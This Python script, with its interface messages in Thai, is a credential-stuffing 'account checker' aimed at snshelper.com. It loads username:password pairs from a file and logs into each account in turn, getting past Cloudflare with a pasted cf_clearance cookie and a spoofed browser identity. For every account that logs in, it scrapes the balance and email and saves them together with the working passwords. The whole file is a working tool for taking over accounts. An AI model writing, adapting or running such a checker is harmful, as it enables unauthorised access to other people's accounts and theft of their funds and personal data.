import requests
from bs4 import BeautifulSoup
import re
import os
import time
from datetime import datetime
from colorama import init, Fore, Back, Style

init(autoreset=True)

CF_CLEARANCE = "ใส่cf_clearanceตรงนี้"

DEBUG = True

class SNSHelperChecker:
    def __init__(self, cf_clearance=""):
        self.session = requests.Session()
        self.base_url = "https://snshelper.com"
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'th-TH,th;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        self.session.headers.update(self.headers)
        
        if cf_clearance:
            self.session.cookies.set('cf_clearance', cf_clearance, domain='.snshelper.com')
        
        self.csrf_token = None
        self.last_profile_html = ""
        
    def get_csrf_token(self):
        try:
            response = self.session.get(f"{self.base_url}/th", timeout=60)
            
            if DEBUG:
                print(Fore.YELLOW + f"   🔍 GET /th Status: {response.status_code}")
            
            if response.status_code != 200:
                return None
            
            cookies = self.session.cookies.get_dict()
            if 'csrf_snshelper_cookie' in cookies:
                self.csrf_token = cookies['csrf_snshelper_cookie']
                if DEBUG:
                    print(Fore.GREEN + f"   ✅ CSRF: {self.csrf_token[:16]}...")
                return self.csrf_token
            
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_input = soup.find('input', {'name': 'csrf_snshelper_token'})
            if csrf_input and csrf_input.get('value'):
                self.csrf_token = csrf_input.get('value')
                return self.csrf_token
                    
        except Exception as e:
            print(Fore.RED + f"   ⚠️ Error: {str(e)}")
        return None
    
    def login(self, username, password):
        try:
            time.sleep(1)
            
            csrf_token = self.get_csrf_token()
            if not csrf_token:
                return False, "ไม่สามารถดึง CSRF Token ได้"
            
            login_url = f"{self.base_url}/th/login"
            payload = {
                'csrf_snshelper_token': csrf_token,
                'user_login': username,
                'user_login_password': password,
            }
            
            login_headers = {
                'Accept': '*/*',
                'x-requested-with': 'XMLHttpRequest',
                'origin': self.base_url,
                'referer': f'{self.base_url}/th',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'Content-Type': 'application/x-www-form-urlencoded',
            }
            
            response = self.session.post(login_url, data=payload, headers=login_headers, timeout=60)
            
            if DEBUG:
                print(Fore.YELLOW + f"   🔍 POST /login Status: {response.status_code}")
                try:
                    print(Fore.YELLOW + f"   🔍 Response: {response.text[:50]}")
                except:
                    pass
            
            time.sleep(0.5)
            profile_response = self.session.get(f"{self.base_url}/th/profile", timeout=60)
            
            if DEBUG:
                print(Fore.YELLOW + f"   🔍 GET /profile Status: {profile_response.status_code}")
            
            if profile_response.status_code == 200:
                profile_text = profile_response.text
                self.last_profile_html = profile_text
                
                if 'ยอดเงินในบัญชี' in profile_text or 'ไอดีผู้ใช้' in profile_text:
                    if DEBUG:
                        print(Fore.GREEN + f"   ✅ พบหน้า Profile!")
                    return True, "เข้าสู่ระบบสำเร็จ"
                
                if username.lower() in profile_text.lower():
                    if DEBUG:
                        print(Fore.GREEN + f"   ✅ พบ username ในหน้า Profile!")
                    return True, "เข้าสู่ระบบสำเร็จ"
                
                if 'login' in profile_response.url.lower() or 'เข้าสู่ระบบ' in profile_text:
                    return False, "เข้าสู่ระบบล้มเหลว"
            
            return False, "เข้าสู่ระบบล้มเหลว"
            
        except Exception as e:
            return False, f"เกิดข้อผิดพลาด: {str(e)}"
    
    def get_profile_info(self):
        try:
            if self.last_profile_html:
                html_text = self.last_profile_html
            else:
                profile_url = f"{self.base_url}/th/profile"
                response = self.session.get(profile_url, timeout=60)
                if response.status_code != 200:
                    return None
                html_text = response.text
            
            soup = BeautifulSoup(html_text, 'html.parser')
            
            balance = "ไม่พบข้อมูล"
            
            match = re.search(r'฿\s*([\d,]+(?:\.\d{1,2})?)', html_text)
            if match:
                balance = f"฿{match.group(1)}"
                if DEBUG:
                    print(Fore.CYAN + f"   💰 พบยอดเงิน: {balance}")
            
            email = "ไม่พบข้อมูล"
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            
            for inp in soup.find_all('input'):
                val = inp.get('value', '')
                if val and '@' in val and '.' in val:
                    if 'snshelper' not in val.lower() and 'example' not in val.lower():
                        email = val
                        if DEBUG:
                            print(Fore.CYAN + f"   📧 พบอีเมล: {email}")
                        break
            
            if email == "ไม่พบข้อมูล":
                all_emails = re.findall(email_pattern, html_text)
                for found_email in all_emails:
                    if 'snshelper' not in found_email.lower() and 'example' not in found_email.lower():
                        email = found_email
                        if DEBUG:
                            print(Fore.CYAN + f"   📧 พบอีเมล: {email}")
                        break
            
            return {
                'balance': balance,
                'email': email
            }
            
        except Exception as e:
            if DEBUG:
                print(Fore.RED + f"   ⚠️ Profile Error: {str(e)}")
            return None
    
    def reset_session(self, cf_clearance=""):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if cf_clearance:
            self.session.cookies.set('cf_clearance', cf_clearance, domain='.snshelper.com')
        self.csrf_token = None
        self.last_profile_html = ""


def print_banner():
    print(Fore.CYAN + Style.BRIGHT + """
╔══════════════════════════════════════════════════════════════╗
║  🔥 SNS Helper Account Checker 🔥                            ║
║  ✨ ตรวจสอบบัญชี SNSHelper.com อัตโนมัติ ✨                  ║
╚══════════════════════════════════════════════════════════════╝
    """)


def print_success(username, password, balance, email):
    print(Fore.GREEN + Style.BRIGHT + """
╔══════════════════════════════════════════════════════════════╗
║  ✅ เข้าสู่ระบบสำเร็จ! ✅                                     ║
╠══════════════════════════════════════════════════════════════╣""")
    print(Fore.YELLOW + f"║  👤 ชื่อผู้ใช้  : {username:<40} ║")
    print(Fore.MAGENTA + f"║  🔑 รหัสผ่าน   : {password:<40} ║")
    print(Fore.CYAN + f"║  💰 ยอดเงิน   : {balance:<40} ║")
    print(Fore.BLUE + f"║  📧 อีเมล     : {email:<40} ║")
    print(Fore.GREEN + Style.BRIGHT + "╚══════════════════════════════════════════════════════════════╝")


def print_failed(username, reason):
    print(Fore.RED + f"❌ ล้มเหลว: {username} - {reason}")


def save_result(username, password, balance, email, filename="results.txt"):
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"📅 เวลา: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"👤 ชื่อผู้ใช้: {username}\n")
        f.write(f"🔑 รหัสผ่าน: {password}\n")
        f.write(f"💰 ยอดเงิน: {balance}\n")
        f.write(f"📧 อีเมล: {email}\n")
        f.write(f"{'='*50}\n")
    print(Fore.GREEN + f"💾 บันทึกลงไฟล์ {filename} แล้ว!")


def load_accounts(filename="accounts.txt"):
    accounts = []
    if not os.path.exists(filename):
        print(Fore.YELLOW + f"⚠️ ไม่พบไฟล์ {filename}")
        return accounts
    
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                parts = line.split(':', 1)
                if len(parts) == 2:
                    accounts.append((parts[0], parts[1]))
    
    return accounts


def main():
    print_banner()
    
    if CF_CLEARANCE == "ใส่cf_clearanceตรงนี้" or not CF_CLEARANCE:
        print(Fore.RED + """
⚠️ กรุณาใส่ cf_clearance cookie ที่บรรทัด 11 ของไฟล์นี้
วิธีดึง: Chrome > F12 > Application > Cookies > cf_clearance
        """)
        return
    
    accounts = load_accounts()
    
    if not accounts:
        print(Fore.YELLOW + "\n📋 ไม่พบบัญชี กรุณาใส่ด้านล่าง:")
        username = input(Fore.CYAN + "👤 ชื่อผู้ใช้: " + Fore.WHITE)
        password = input(Fore.CYAN + "🔑 รหัสผ่าน: " + Fore.WHITE)
        accounts = [(username, password)]
    
    print(Fore.CYAN + f"\n🔍 พบ {len(accounts)} บัญชี\n")
    print(Fore.YELLOW + "=" * 60)
    
    checker = SNSHelperChecker(cf_clearance=CF_CLEARANCE)
    success_count = 0
    failed_count = 0
    
    for i, (username, password) in enumerate(accounts, 1):
        print(Fore.CYAN + f"\n🔄 [{i}/{len(accounts)}] ตรวจสอบ: {username}")
        
        checker.reset_session(cf_clearance=CF_CLEARANCE)
        
        success, message = checker.login(username, password)
        
        if success:
            profile_info = checker.get_profile_info()
            
            if profile_info:
                balance = profile_info['balance']
                email = profile_info['email']
            else:
                balance = "ไม่สามารถดึงได้"
                email = "ไม่สามารถดึงได้"
            
            print_success(username, password, balance, email)
            save_result(username, password, balance, email)
            success_count += 1
        else:
            print_failed(username, message)
            failed_count += 1
    
    print(Fore.CYAN + Style.BRIGHT + f"""
╔══════════════════════════════════════════════════════════════╗
║  📊 สรุปผล                                                   ║
╠══════════════════════════════════════════════════════════════╣
║  ✅ สำเร็จ   : {success_count:<46} ║
║  ❌ ล้มเหลว : {failed_count:<46} ║
║  📁 ทั้งหมด  : {len(accounts):<46} ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if success_count > 0:
        print(Fore.GREEN + "💾 ผลลัพธ์บันทึกที่ results.txt")


if __name__ == "__main__":
    main()
